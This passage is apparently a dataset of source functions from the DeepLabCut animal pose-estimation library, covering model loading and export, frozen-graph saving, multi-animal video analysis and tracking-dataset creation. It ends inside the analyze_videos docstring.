        (sess, _, _) = predict.setup_GPUpose_prediction(dlc_cfg)
        output = ['concat_1']
    else:
        (sess, _, _) = predict.setup_pose_prediction(dlc_cfg)
        if dlc_cfg['location_refinement']:
            output = ['Sigmoid', 'pose/locref_pred/block4/BiasAdd']
        else:
            output = ['Sigmoid', 'pose/part_pred/block4/BiasAdd']
    input = tf.compat.v1.get_default_graph().get_operations()[0].name
    return (sess, input, output, dlc_cfg)"
AlexEMG/DeepLabCut,tf_to_pb,"def tf_to_pb(sess, checkpoint, output, output_dir=None):
    """"""

    Saves a frozen tensorflow graph (a protobuf file).
    See also https://leimao.github.io/blog/Save-Load-Inference-From-TF-Frozen-Graph/

    Parameters
    ----------
    sess : tensorflow session
        session with graph to be saved

    checkpoint : string
        checkpoint of tensorflow model to be converted to protobuf (output will be <checkpoint>.pb)

    output : list of strings
        list of the names of output nodes (is returned by load_models)

    output_dir : string, optional
        path to the directory that exported models should be saved to.
        If None, will export to the directory of the checkpoint file.
    """"""
    output_dir = os.path.expanduser(output_dir) if output_dir else os.path.dirname(checkpoint)
    ckpt_base = os.path.basename(checkpoint)
    pbtxt_file = os.path.normpath(output_dir + '/' + ckpt_base + '.pbtxt')
    tf.io.write_graph(sess.graph.as_graph_def(), '', pbtxt_file, as_text=True)
    pb_file = os.path.normpath(output_dir + '/' + ckpt_base + '.pb')
    frozen_graph_def = tf.compat.v1.graph_util.convert_variables_to_constants(sess, sess.graph_def, output)
    with open(pb_file, 'wb') as file:
        file.write(frozen_graph_def.SerializeToString())"
AlexEMG/DeepLabCut,export_model,"def export_model(cfg_path, shuffle=1, trainingsetindex=0, snapshotindex=None, iteration=None, TFGPUinference=True, overwrite=False, make_tar=True, wipepaths=False, modelprefix=''):
    """"""

    Export DeepLabCut models for the model zoo or for live inference.

    Saves the pose configuration, snapshot files, and frozen TF graph of the model to
    directory named exported-models within the project directory

    Parameters
    -----------

    cfg_path : string
        path to the DLC Project config.yaml file

    shuffle : int, optional
        the shuffle of the model to export. default = 1

    trainingsetindex : int, optional
        the index of the training fraction for the model you wish to export. default = 1

    snapshotindex : int, optional
        the snapshot index for the weights you wish to export. If None,
        uses the snapshotindex as defined in 'config.yaml'. Default = None

    iteration : int, optional
        The model iteration (active learning loop) you wish to export. If None,
        the iteration listed in the config file is used.

    TFGPUinference : bool, optional
        use the tensorflow inference model? Default = True
        For inference using DeepLabCut-live, it is recommended to set TFGPIinference=False

    overwrite : bool, optional
        if the model you wish to export has already been exported, whether to overwrite. default = False

    make_tar : bool, optional
        Do you want to compress the exported directory to a tar file? Default = True
        This is necessary to export to the model zoo, but not for live inference.

    wipepaths : bool, optional
        Removes the actual path of your project and the init_weights from pose_cfg.

    Example:
    --------
    Export the first stored snapshot for model trained with shuffle 3:
    >>> deeplabcut.export_model('/analysis/project/reaching-task/config.yaml',shuffle=3, snapshotindex=-1)
    --------
    """"""
    try:
        cfg = auxiliaryfunctions.read_config(cfg_path)
    except FileNotFoundError:
        FileNotFoundError('The config.yaml file at %s does not exist.' % cfg_path)
    cfg['project_path'] = os.path.dirname(os.path.realpath(cfg_path))
    cfg['iteration'] = iteration if iteration is not None else cfg['iteration']
    cfg['batch_size'] = cfg['batch_size'] if cfg['batch_size'] > 1 else 2
    cfg['snapshotindex'] = snapshotindex if snapshotindex is not None else cfg['snapshotindex']
    (sess, input, output, dlc_cfg) = load_model(cfg, shuffle, trainingsetindex, TFGPUinference, modelprefix)
    ckpt = dlc_cfg['init_weights']
    model_dir = os.path.dirname(ckpt)
    export_dir = os.path.normpath(cfg['project_path'] + '/' + 'exported-models')
    if not os.path.isdir(export_dir):
        os.mkdir(export_dir)
    sub_dir_name = 'DLC_%s_%s_iteration-%d_shuffle-%d' % (cfg['Task'], dlc_cfg['net_type'], cfg['iteration'], shuffle)
    full_export_dir = os.path.normpath(export_dir + '/' + sub_dir_name)
    if os.path.isdir(full_export_dir):
        if not overwrite:
            raise FileExistsError('Export directory %s already exists. Terminating export...' % full_export_dir)
    else:
        os.mkdir(full_export_dir)
    dlc_cfg = dict(dlc_cfg)
    sorted_cfg = {}
    for (key, value) in sorted(dlc_cfg.items()):
        if wipepaths:
            if key in ['init_weights', 'project_path', 'snapshot_prefix']:
                sorted_cfg[key] = 'TBA'
            else:
                sorted_cfg[key] = value
        else:
            sorted_cfg[key] = value
    pose_cfg_file = os.path.normpath(full_export_dir + '/pose_cfg.yaml')
    ruamel_file = ruamel.yaml.YAML()
    ruamel_file.dump(sorted_cfg, open(pose_cfg_file, 'w'))
    ckpt_files = glob.glob(ckpt + '*')
    ckpt_dest = [os.path.normpath(full_export_dir + '/' + os.path.basename(ckf)) for ckf in ckpt_files]
    for (ckf, ckd) in zip(ckpt_files, ckpt_dest):
        shutil.copy(ckf, ckd)
    tf_to_pb(sess, ckpt, output, output_dir=full_export_dir)
    if make_tar:
        tar_name = os.path.normpath(full_export_dir + '.tar.gz')
        with tarfile.open(tar_name, 'w:gz') as tar:
            tar.add(full_export_dir, arcname=os.path.basename(full_export_dir))"
AlexEMG/DeepLabCut,extract_bpt_feature_from_video,"def extract_bpt_feature_from_video(video, DLCscorer, trainFraction, cfg, dlc_cfg, sess, inputs, outputs, extra_dict, destfolder=None, robust_nframes=False):
    print('Starting to analyze % ', video)
    vname = Path(video).stem
    videofolder = str(Path(video).parents[0])
    if destfolder is None:
        destfolder = videofolder
    auxiliaryfunctions.attempt_to_make_folder(destfolder)
    dataname = os.path.join(destfolder, vname + DLCscorer + '.h5')
    assemble_filename = dataname.split('.h5')[0] + '_assemblies.pickle'
    feature_dict = shelve.open(dataname.split('.h5')[0] + '_bpt_features.pickle', protocol=pickle.DEFAULT_PROTOCOL)
    with open(assemble_filename, 'rb') as f:
        assemblies = pickle.load(f)
        print('Loading ', video)
        vid = VideoWriter(video)
        if robust_nframes:
            nframes = vid.get_n_frames(robust=True)
            duration = vid.calc_duration(robust=True)
            fps = nframes / duration
        else:
            nframes = len(vid)
            duration = vid.calc_duration(robust=False)
            fps = vid.fps
        (nx, ny) = vid.dimensions
        print('Duration of video [s]: ', round(duration, 2), ', recorded with ', round(fps, 2), 'fps!')
        print('Overall # of frames: ', nframes, ' found with (before cropping) frame dimensions: ', nx, ny)
        start = time.time()
        print('Starting to extract posture')
        if int(dlc_cfg['batch_size']) > 1:
            (PredicteData, nframes) = GetPoseandCostsF_from_assemblies(cfg, dlc_cfg, sess, inputs, outputs, vid, nframes, int(dlc_cfg['batch_size']), assemblies, feature_dict, extra_dict)
        else:
            raise NotImplementedError('Not implemented yet, please raise an GitHub issue if you need this.')"
AlexEMG/DeepLabCut,AnalyzeMultiAnimalVideo,"def AnalyzeMultiAnimalVideo(video, DLCscorer, trainFraction, cfg, dlc_cfg, sess, inputs, outputs, destfolder=None, robust_nframes=False, use_shelve=False):
    """"""Helper function for analyzing a video with multiple individuals""""""
    print('Starting to analyze % ', video)
    vname = Path(video).stem
    videofolder = str(Path(video).parents[0])
    if destfolder is None:
        destfolder = videofolder
    auxiliaryfunctions.attempt_to_make_folder(destfolder)
    dataname = os.path.join(destfolder, vname + DLCscorer + '.h5')
    if os.path.isfile(dataname.split('.h5')[0] + '_full.pickle'):
        print('Video already analyzed!', dataname)
    else:
        print('Loading ', video)
        vid = VideoWriter(video)
        if robust_nframes:
            nframes = vid.get_n_frames(robust=True)
            duration = vid.calc_duration(robust=True)
            fps = nframes / duration
        else:
            nframes = len(vid)
            duration = vid.calc_duration(robust=False)
            fps = vid.fps
        (nx, ny) = vid.dimensions
        print('Duration of video [s]: ', round(duration, 2), ', recorded with ', round(fps, 2), 'fps!')
        print('Overall # of frames: ', nframes, ' found with (before cropping) frame dimensions: ', nx, ny)
        start = time.time()
        print('Starting to extract posture from the video(s) with batchsize:', dlc_cfg['batch_size'])
        if use_shelve:
            shelf_path = dataname.split('.h5')[0] + '_full.pickle'
        else:
            shelf_path = ''
        if int(dlc_cfg['batch_size']) > 1:
            (PredicteData, nframes) = GetPoseandCostsF(cfg, dlc_cfg, sess, inputs, outputs, vid, nframes, int(dlc_cfg['batch_size']), shelf_path)
        else:
            (PredicteData, nframes) = GetPoseandCostsS(cfg, dlc_cfg, sess, inputs, outputs, vid, nframes, shelf_path)
        stop = time.time()
        if cfg['cropping'] == True:
            coords = [cfg['x1'], cfg['x2'], cfg['y1'], cfg['y2']]
        else:
            coords = [0, nx, 0, ny]
        dictionary = {'start': start, 'stop': stop, 'run_duration': stop - start, 'Scorer': DLCscorer, 'DLC-model-config file': dlc_cfg, 'fps': fps, 'batch_size': dlc_cfg['batch_size'], 'frame_dimensions': (ny, nx), 'nframes': nframes, 'iteration (active-learning)': cfg['iteration'], 'training set fraction': trainFraction, 'cropping': cfg['cropping'], 'cropping_parameters': coords}
        metadata = {'data': dictionary}
        print('Video Analyzed. Saving results in %s...' % destfolder)
        if use_shelve:
            metadata_path = dataname.split('.h5')[0] + '_meta.pickle'
            with open(metadata_path, 'wb') as f:
                pickle.dump(metadata, f, pickle.HIGHEST_PROTOCOL)
        else:
            _ = auxfun_multianimal.SaveFullMultiAnimalData(PredicteData, metadata, dataname)"
AlexEMG/DeepLabCut,_get_features_dict,"def _get_features_dict(raw_coords, features, stride):
    from deeplabcut.pose_tracking_pytorch import load_features_from_coord, convert_coord_from_img_space_to_feature_space
    coords_img_space = np.array([coord[:, :2] for coord in raw_coords])
    coords_feature_space = convert_coord_from_img_space_to_feature_space(coords_img_space, stride)
    bpt_features = load_features_from_coord(features.astype(np.float16), coords_feature_space)
    return {'features': bpt_features, 'coordinates': coords_img_space}"
AlexEMG/DeepLabCut,GetPoseandCostsF_from_assemblies,"def GetPoseandCostsF_from_assemblies(cfg, dlc_cfg, sess, inputs, outputs, cap, nframes, batchsize, assemblies, feature_dict, extra_dict):
    """"""Batchwise prediction of pose""""""
    strwidth = int(np.ceil(np.log10(nframes)))
    batch_ind = 0
    batch_num = 0
    if cfg['cropping']:
        cap.set_bbox(cfg['x1'], cfg['x2'], cfg['y1'], cfg['y2'])
    (nx, ny) = cap.dimensions
    frames = np.empty((batchsize, ny, nx, 3), dtype='ubyte')
    pbar = tqdm(total=nframes)
    counter = 0
    inds = []
    PredicteData = {}
    while cap.video.isOpened():
        frame = cap.read_frame(crop=cfg['cropping'])
        key = 'frame' + str(counter).zfill(strwidth)
        if frame is not None:
            if key in feature_dict:
                continue
            frame = img_as_ubyte(frame)
            if frame.shape[-1] == 4:
                frame = rgba2rgb(frame)
            frames[batch_ind] = frame
            inds.append(counter)
            if batch_ind == batchsize - 1:
                preds = predict.predict_batched_peaks_and_costs(dlc_cfg, frames, sess, inputs, outputs, extra_dict=extra_dict)
                if not preds:
                    continue
                (D, features) = preds
                for (i, (ind, data)) in enumerate(zip(inds, D)):
                    PredicteData['frame' + str(ind).zfill(strwidth)] = data
                    raw_coords = assemblies.get(ind)
                    if raw_coords is None:
                        continue
                    fname = 'frame' + str(ind).zfill(strwidth)
                    feature_dict[fname] = _get_features_dict(raw_coords, features[i], dlc_cfg['stride'])
                batch_ind = 0
                inds.clear()
                batch_num += 1
            else:
                batch_ind += 1
        elif counter >= nframes:
            if batch_ind > 0:
                preds = predict.predict_batched_peaks_and_costs(dlc_cfg, frames, sess, inputs, outputs, extra_dict=extra_dict)
                if not preds:
                    continue
                (D, features) = preds
                for (i, (ind, data)) in enumerate(zip(inds, D)):
                    PredicteData['frame' + str(ind).zfill(strwidth)] = data
                    raw_coords = assemblies.get(ind)
                    if raw_coords is None:
                        continue
                    fname = 'frame' + str(ind).zfill(strwidth)
                    feature_dict[fname] = _get_features_dict(raw_coords, features[i], dlc_cfg['stride'])
            break
        counter += 1
        pbar.update(1)
    cap.close()
    pbar.close()
    feature_dict.close()
    PredicteData['metadata'] = {'nms radius': dlc_cfg['nmsradius'], 'minimal confidence': dlc_cfg['minconfidence'], 'sigma': dlc_cfg.get('sigma', 1), 'PAFgraph': dlc_cfg['partaffinityfield_graph'], 'PAFinds': dlc_cfg.get('paf_best', np.arange(len(dlc_cfg['partaffinityfield_graph']))), 'all_joints': [[i] for i in range(len(dlc_cfg['all_joints']))], 'all_joints_names': [dlc_cfg['all_joints_names'][i] for i in range(len(dlc_cfg['all_joints']))], 'nframes': nframes}
    return (PredicteData, nframes)"
AlexEMG/DeepLabCut,GetPoseandCostsF,"def GetPoseandCostsF(cfg, dlc_cfg, sess, inputs, outputs, cap, nframes, batchsize, shelf_path):
    """"""Batchwise prediction of pose""""""
    strwidth = int(np.ceil(np.log10(nframes)))
    batch_ind = 0
    batch_num = 0
    if cfg['cropping']:
        cap.set_bbox(cfg['x1'], cfg['x2'], cfg['y1'], cfg['y2'])
    (nx, ny) = cap.dimensions
    frames = np.empty((batchsize, ny, nx, 3), dtype='ubyte')
    pbar = tqdm(total=nframes)
    counter = 0
    inds = []
    if shelf_path:
        db = shelve.open(shelf_path, protocol=pickle.DEFAULT_PROTOCOL)
    else:
        db = dict()
    db['metadata'] = {'nms radius': dlc_cfg['nmsradius'], 'minimal confidence': dlc_cfg['minconfidence'], 'sigma': dlc_cfg.get('sigma', 1), 'PAFgraph': dlc_cfg['partaffinityfield_graph'], 'PAFinds': dlc_cfg.get('paf_best', np.arange(len(dlc_cfg['partaffinityfield_graph']))), 'all_joints': [[i] for i in range(len(dlc_cfg['all_joints']))], 'all_joints_names': [dlc_cfg['all_joints_names'][i] for i in range(len(dlc_cfg['all_joints']))], 'nframes': nframes}
    while cap.video.isOpened():
        frame = cap.read_frame(crop=cfg['cropping'])
        key = 'frame' + str(counter).zfill(strwidth)
        if frame is not None:
            if isinstance(db, shelve.Shelf) and key in db:
                continue
            frame = img_as_ubyte(frame)
            if frame.shape[-1] == 4:
                frame = rgba2rgb(frame)
            frames[batch_ind] = frame
            inds.append(counter)
            if batch_ind == batchsize - 1:
                D = predict.predict_batched_peaks_and_costs(dlc_cfg, frames, sess, inputs, outputs)
                for (ind, data) in zip(inds, D):
                    db['frame' + str(ind).zfill(strwidth)] = data
                del D
                batch_ind = 0
                inds.clear()
                batch_num += 1
            else:
                batch_ind += 1
        elif counter >= nframes:
            if batch_ind > 0:
                D = predict.predict_batched_peaks_and_costs(dlc_cfg, frames, sess, inputs, outputs)
                for (ind, data) in zip(inds, D):
                    db['frame' + str(ind).zfill(strwidth)] = data
                del D
            break
        counter += 1
        pbar.update(1)
    cap.close()
    pbar.close()
    try:
        db.close()
    except AttributeError:
        pass
    return (db, nframes)"
AlexEMG/DeepLabCut,GetPoseandCostsS,"def GetPoseandCostsS(cfg, dlc_cfg, sess, inputs, outputs, cap, nframes, shelf_path):
    """"""Non batch wise pose estimation for video cap.""""""
    strwidth = int(np.ceil(np.log10(nframes)))
    if cfg['cropping']:
        cap.set_bbox(cfg['x1'], cfg['x2'], cfg['y1'], cfg['y2'])
    if shelf_path:
        db = shelve.open(shelf_path, protocol=pickle.DEFAULT_PROTOCOL)
    else:
        db = dict()
    db['metadata'] = {'nms radius': dlc_cfg['nmsradius'], 'minimal confidence': dlc_cfg['minconfidence'], 'sigma': dlc_cfg.get('sigma', 1), 'PAFgraph': dlc_cfg['partaffinityfield_graph'], 'PAFinds': dlc_cfg.get('paf_best', np.arange(len(dlc_cfg['partaffinityfield_graph']))), 'all_joints': [[i] for i in range(len(dlc_cfg['all_joints']))], 'all_joints_names': [dlc_cfg['all_joints_names'][i] for i in range(len(dlc_cfg['all_joints']))], 'nframes': nframes}
    pbar = tqdm(total=nframes)
    counter = 0
    while cap.video.isOpened():
        frame = cap.read_frame(crop=cfg['cropping'])
        key = 'frame' + str(counter).zfill(strwidth)
        if frame is not None:
            if isinstance(db, shelve.Shelf) and key in db:
                continue
            frame = img_as_ubyte(frame)
            if frame.shape[-1] == 4:
                frame = rgba2rgb(frame)
            dets = predict.predict_batched_peaks_and_costs(dlc_cfg, np.expand_dims(frame, axis=0), sess, inputs, outputs)
            if not dets:
                continue
            db[key] = dets[0]
            del dets
        elif counter >= nframes:
            break
        counter += 1
        pbar.update(1)
    pbar.close()
    try:
        db.close()
    except AttributeError:
        pass
    return (db, nframes)"
AlexEMG/DeepLabCut,video_inference_superanimal,"def video_inference_superanimal(videos, superanimal_name, scale_list=[], videotype='.mp4', video_adapt=False, plot_trajectories=True, pcutoff=0.1, adapt_iterations=1000, pseudo_threshold=0.1):
    """"""
    Makes prediction based on a super animal model. Note right now we only support single animal video inference

    The index of the trained network is specified by parameters in the config file (in particular the variable 'snapshotindex')

    Output: The labels are stored as MultiIndex Pandas Array, which contains the name of the network, body part name, (x, y) label position 

            in pixels, and the likelihood for each frame per body part. These arrays are stored in an efficient Hierarchical Data Format (HDF) 

            in the same directory, where the video is stored.

    Parameters
    ----------
    videos: list
        A list of strings containing the full paths to videos for analysis or a path to the directory, where all the videos with same extension are stored.

    superanimal_name: str
        The name of the superanimal model. We currently only support ""superanimal_quadruped"" and ""superanimal_topviewmouse""
    scale_list: list
        A list of int containing the target height of the multi scale test time augmentation. By default it uses the original size. Users are advised to try a wide range of scale list when the super model does not give reasonable results

    videotype: string, optional
        Checks for the extension of the video in case the input to the video is a directory.
 Only videos with this extension are analyzed. The default is ``.avi``

    video_adapt: bool, optional
        Set True if you want to apply video adaptation to make the resulted video less jittering and better. However, adaptation training takes more time than usual video inference

    plot_trajectories: bool, optional (default=True)
        By default, plot the trajectories of various body parts across the video.

    pcutoff: float, optional
        Keypoints confidence that are under pcutoff will not be shown in the resulted video

    adapt_iterations: int, optional:
        Number of iterations for adaptation training

    pseudo_threshold: float, default 0.1
        Video adaptation only uses predictions that are above pseudo_threshold

    Given a list of scales for spatial pyramid, i.e. [600, 700]

    scale_list = range(600,800,100)

    superanimal_name = 'superanimal_topviewmouse'
    videotype = 'mp4'
    scale_list = [200, 300, 400]
    deeplabcut.video_inference_superanimal(
         video,
         superanimal_name,
         videotype = '.avi',
         scale_list = scale_list,
    )
    >>>
    """"""
    from deeplabcut.utils.auxiliaryfunctions import get_deeplabcut_path
    for video in videos:
        vname = Path(video).stem
        dlcparent_path = get_deeplabcut_path()
        modelfolder = Path(dlcparent_path) / 'pose_estimation_tensorflow' / 'models' / 'pretrained' / (superanimal_name + '_' + vname + '_weights')
        adapter = SpatiotemporalAdaptation(video, superanimal_name, modelfolder=modelfolder, videotype=videotype, scale_list=scale_list)
        if not video_adapt:
            adapter.before_adapt_inference(make_video=True, pcutoff=pcutoff, plot_trajectories=plot_trajectories)
        else:
            adapter.before_adapt_inference(make_video=False)
            adapter.adaptation_training(adapt_iterations=adapt_iterations, pseudo_threshold=pseudo_threshold)
            adapter.after_adapt_inference(pcutoff=pcutoff, plot_trajectories=plot_trajectories)"
AlexEMG/DeepLabCut,create_tracking_dataset,"def create_tracking_dataset(config, videos, track_method, videotype='', shuffle=1, trainingsetindex=0, gputouse=None, save_as_csv=False, destfolder=None, batchsize=None, cropping=None, TFGPUinference=True, dynamic=(False, 0.5, 10), modelprefix='', robust_nframes=False, n_triplets=1000):
    try:
        from deeplabcut.pose_tracking_pytorch import create_triplets_dataset
    except ModuleNotFoundError:
        raise ModuleNotFoundError('Unsupervised identity learning requires PyTorch. Please run `pip install torch`.')
    from deeplabcut.pose_estimation_tensorflow.predict_multianimal import extract_bpt_feature_from_video
    allow_growth = True
    if 'TF_CUDNN_USE_AUTOTUNE' in os.environ:
        del os.environ['TF_CUDNN_USE_AUTOTUNE']
    if gputouse is not None:
        auxfun_models.set_visible_devices(gputouse)
    tf.compat.v1.reset_default_graph()
    start_path = os.getcwd()
    cfg = auxiliaryfunctions.read_config(config)
    trainFraction = cfg['TrainingFraction'][trainingsetindex]
    if cropping is not None:
        cfg['cropping'] = True
        (cfg['x1'], cfg['x2'], cfg['y1'], cfg['y2']) = cropping
        print('Overwriting cropping parameters:', cropping)
        print(""These are used for all videos, but won't be save to the cfg file."")
    modelfolder = os.path.join(cfg['project_path'], str(auxiliaryfunctions.get_model_folder(trainFraction, shuffle, cfg, modelprefix=modelprefix)))
    path_test_config = Path(modelfolder) / 'test' / 'pose_cfg.yaml'
    try:
        dlc_cfg = load_config(str(path_test_config))
    except FileNotFoundError:
        raise FileNotFoundError('It seems the model for shuffle %s and trainFraction %s does not exist.' % (shuffle, trainFraction))
    try:
        Snapshots = np.array([fn.split('.')[0] for fn in os.listdir(os.path.join(modelfolder, 'train')) if 'index' in fn])
    except FileNotFoundError:
        raise FileNotFoundError(""Snapshots not found! It seems the dataset for shuffle %s has not been trained/does not exist.\n Please train it before using it to analyze videos.\n Use the function 'train_network' to train the network for shuffle %s."" % (shuffle, shuffle))
    if cfg['snapshotindex'] == 'all':
        print(""Snapshotindex is set to 'all' in the config.yaml file. Running video analysis with all snapshots is very costly! Use the function 'evaluate_network' to choose the best the snapshot. For now, changing snapshot index to -1!"")
        snapshotindex = -1
    else:
        snapshotindex = cfg['snapshotindex']
    increasing_indices = np.argsort([int(m.split('-')[1]) for m in Snapshots])
    Snapshots = Snapshots[increasing_indices]
    print('Using %s' % Snapshots[snapshotindex], 'for model', modelfolder)
    dlc_cfg['init_weights'] = os.path.join(modelfolder, 'train', Snapshots[snapshotindex])
    trainingsiterations = dlc_cfg['init_weights'].split(os.sep)[-1].split('-')[-1]
    dlc_cfg['num_outputs'] = cfg.get('num_outputs', dlc_cfg.get('num_outputs', 1))
    if batchsize is None:
        dlc_cfg['batch_size'] = cfg['batch_size']
    else:
        dlc_cfg['batch_size'] = batchsize
        cfg['batch_size'] = batchsize
    if 'multi-animal' in dlc_cfg['dataset_type']:
        dynamic = (False, 0.5, 10)
        TFGPUinference = False
    if dynamic[0]:
        print('Starting analysis in dynamic cropping mode with parameters:', dynamic)
        dlc_cfg['num_outputs'] = 1
        TFGPUinference = False
        dlc_cfg['batch_size'] = 1
        print('Switching batchsize to 1, num_outputs (per animal) to 1 and TFGPUinference to False (all these features are not supported in this mode).')
    (DLCscorer, DLCscorerlegacy) = auxiliaryfunctions.get_scorer_name(cfg, shuffle, trainFraction, trainingsiterations=trainingsiterations, modelprefix=modelprefix)
    if dlc_cfg['num_outputs'] > 1:
        if TFGPUinference:
            print('Switching to numpy-based keypoint extraction code, as multiple point extraction is not supported by TF code currently.')
            TFGPUinference = False
        print('Extracting ', dlc_cfg['num_outputs'], 'instances per bodypart')
        xyz_labs_orig = ['x', 'y', 'likelihood']
        suffix = [str(s + 1) for s in range(dlc_cfg['num_outputs'])]
        suffix[0] = ''
        xyz_labs = [x + s for s in suffix for x in xyz_labs_orig]
    else:
        xyz_labs = ['x', 'y', 'likelihood']
    if TFGPUinference:
        (sess, inputs, outputs) = predict.setup_GPUpose_prediction(dlc_cfg, allow_growth=allow_growth)
    else:
        (sess, inputs, outputs, extra_dict) = predict.setup_pose_prediction(dlc_cfg, allow_growth=allow_growth, collect_extra=True)
    pdindex = pd.MultiIndex.from_product([[DLCscorer], dlc_cfg['all_joints_names'], xyz_labs], names=['scorer', 'bodyparts', 'coords'])
    Videos = auxiliaryfunctions.get_list_of_videos(videos, videotype)
    if len(Videos) > 0:
        if 'multi-animal' in dlc_cfg['dataset_type']:
            for video in Videos:
                extract_bpt_feature_from_video(video, DLCscorer, trainFraction, cfg, dlc_cfg, sess, inputs, outputs, extra_dict, destfolder=destfolder, robust_nframes=robust_nframes)
            sess.close()
            tf.keras.backend.clear_session()
            create_triplets_dataset(Videos, DLCscorer, track_method, n_triplets=n_triplets, destfolder=destfolder)
        else:
            raise NotImplementedError('not implemented')
        os.chdir(str(start_path))
        if 'multi-animal' in dlc_cfg['dataset_type']:
            print(""If the tracking is not satisfactory for some videos, consider expanding the training set. You can use the function 'extract_outlier_frames' to extract a few representative outlier frames."")
        else:
            print(""The videos are analyzed. Now your research can truly start! \n You can create labeled videos with 'create_labeled_video'"")
            print(""If the tracking is not satisfactory for some videos, consider expanding the training set. You can use the function 'extract_outlier_frames' to extract a few representative outlier frames."")
        return DLCscorer
    else:
        print(""No video(s) were found. Please check your paths and/or 'videotype'."")
        return DLCscorer"
AlexEMG/DeepLabCut,analyze_videos,"def analyze_videos(config, videos, videotype='', shuffle=1, trainingsetindex=0, gputouse=None, save_as_csv=False, in_random_order=True, destfolder=None, batchsize=None, cropping=None, TFGPUinference=True, dynamic=(False, 0.5, 10), modelprefix='', robust_nframes=False, allow_growth=False, use_shelve=False, auto_track=True, n_tracks=None, calibrate=False, identity_only=False, use_openvino='CPU' if is_openvino_available else None):
    """"""Makes prediction based on a trained network.

    The index of the trained network is specified by parameters in the config file
    (in particular the variable 'snapshotindex').

    The labels are stored as MultiIndex Pandas Array, which contains the name of
    the network, body part name, (x, y) label position in pixels, and the
    likelihood for each frame per body part. These arrays are stored in an
    efficient Hierarchical Data Format (HDF) in the same directory where the video
    is stored. However, if the flag save_as_csv is set to True, the data can also
    be exported in comma-separated values format (.csv), which in turn can be
    imported in many programs, such as MATLAB, R, Prism, etc.

    Parameters
    ----------
    config: str
        Full path of the config.yaml file.

    videos: list[str]
        A list of strings containing the full paths to videos for analysis or a path to
        the directory, where all the videos with same extension are stored.

    videotype: str, optional, default=""""
        Checks for the extension of the video in case the input to the video is a
        directory. Only videos with this extension are analyzed. If left unspecified,
        videos with common extensions ('avi', 'mp4', 'mov', 'mpeg', 'mkv') are kept.

    shuffle: int, optional, default=1
        An integer specifying the shuffle index of the training dataset used for
        training the network.

    trainingsetindex: int, optional, default=0
        Integer specifying which TrainingsetFraction to use.
        By default the first (note that TrainingFraction is a list in config.yaml).

    gputouse: int or None, optional, default=None
        Indicates the GPU to use (see number in ``nvidia-smi``). If you do not have a
        GPU put ``None``.
        See: https://nvidia.custhelp.com/app/answers/detail/a_id/3751/~/useful-nvidia-smi-queries

    save_as_csv: bool, optional, default=False
        Saves the predictions in a .csv file.

    in_random_order: bool, optional (default=True)
        Whether or not to analyze videos in a random order.
        This is only relevant when specifying a video directory in `videos`.

    destfolder: string or None, optional, default=None
        Specifies the destination folder for analysis data. If ``None``, the path of
        the video is used. Note that for subsequent analysis this folder also needs to
        be passed.

    batchsize: int or None, optional, default=None
        Change batch size for inference; if given overwrites value in ``pose_cfg.yaml``.

    cropping: list or None, optional, default=None
        List of cropping coordinates as [x1, x2, y1, y2].
        Note that the same cropping parameters will then be used for all videos.
        If different video crops are desired, run ``analyze_videos`` on individual
        videos with the corresponding cropping coordinates.

    TFGPUinference: bool, optional, default=True
        Perform inference on GPU with TensorFlow code. Introduced in ""Pretraining
        boosts out-of-domain robustness for pose estimation"" by Alexander Mathis,
        Mert Yüksekgönül, Byron Rogers, Matthias Bethge, Mackenzie W. Mathis.
        Source: https://arxiv.org/abs/1909.11229

    dynamic: tuple(bool, float, int) triple containing (state, detectiontreshold, margin)
        If the state is true, then dynamic cropping will be performed. That means that if an object is detected (i.e. any body part > detectiontreshold),
        then object boundaries are computed according to the smallest/largest x position and smallest/largest y position of all body parts. This  window is
        expanded by the margin and from then on only the posture within this crop is analyzed (until the object is lost, i.e. <detectiontreshold). The
        current position is utilized for updating the crop window for the next frame (this is why the margin is important and should be set large
        enough given the movement of the animal).

    modelprefix: str, optional, default=""""
        Directory containing the deeplabcut models to use when evaluating the network.
        By default, the models are assumed to exist in the project folder.

    robust_nframes: bool, optional, default=False
        Evaluate a video's number of frames in a robust manner.
        This option is slower (as the whole video is read frame-by-frame),
        but does not rely on metadata, hence its robustness against file corruption.

    allow_growth: bool, optional, default=False.
        For some smaller GPUs the memory issues happen. If ``True``, the memory
        allocator does not pre-allocate the entire specified GPU memory region, instead
        starting small and growing as needed.
        See issue: https://forum.image.sc/t/how-to-stop-running-out-of-vram/30551/2

    use_shelve: bool, optional, default=False
        By default, data are dumped in a pickle file at the end of the video analysis.
        Otherwise, data are written to disk on the fly using a ""shelf""; i.e., a
        pickle-based, persistent, database-like object by default, resulting in
        constant memory footprint.

    The following parameters are only relevant for multi-animal projects:

    auto_track: bool, optional, default=True
        By default, tracking and stitching are automatically performed, producing the
        final h5 data file. This is equivalent to the behavior for single-animal
        projects.

        If ``False``, one must run ``convert_detections2tracklets`` and
        ``stitch_tracklets`` afterwards, in order to obtain the h5 file.

    This function has 3 related sub-calls:

    identity_only: bool, optional, default=False
        If ``True`` and animal identity was learned by the model, assembly and tracking
        rely exclusively on identity prediction.

    calibrate: bool, optional, default=False
        If ``True``, use training data to calibrate the animal assembly procedure. This
        improves its robustness to wrong body part links, but requires very little
        missing data.

    n_tracks: int or None, optional, default=None
        Number of tracks to reconstruct. By default, taken as the number of individuals
        defined in the config.yaml. Another number can be passed if the number of
        animals in the video is different from the number of animals the model was
        trained on.

    use_openvino: str, optional
        Use ""CPU"" for inference if OpenVINO is available in the Python environment.

    Returns
    -------
    DLCScorer: str
        the scorer used to analyze the videos

    Examples
    --------

    Analyzing a single video on Windows

    >>> deeplabcut.analyze_videos(
            'C:\\myproject\\reaching-task\\config.yaml',
            ['C:\\yourusername\\rig-95\\Videos\\reachingvideo1.avi'],
        )

    Analyzing a single video on Linux/MacOS

    >>> deeplabcut.analyze_videos(
            '/analysis/project/reaching-task/config.yaml',
            ['/analysis/project/videos/reachingvideo1.avi'],
        )

    Analyze all videos of type ``avi`` in a folder

    >>> deeplabcut.analyze_videos(
            '/analysis/project/reaching-task/config.yaml',
            ['/analysis/project/videos'],
            videotype='.avi',
        )

    Analyze multiple videos

    >>> deeplabcut.analyze_videos(
            '/analysis/project/reaching-task/config.yaml',
            [
                '/analysis/project/videos/reachingvideo1.avi',
                '/analysis/project/videos/reachingvideo2.avi',
            ],
        )

    Analyze multiple videos with ``shuffle=2``

    >>> deeplabcut.analyze_videos(
            '/analysis/project/reaching-task/config.yaml',
            [
                '/analysis/project/videos/reachingvideo1.avi',
                '/analysis/project/videos/reachingvideo2.avi',
            ],
            shuffle=2,
        )

    Analyze multiple videos with ``shuffle=2``, save results as an additional csv file

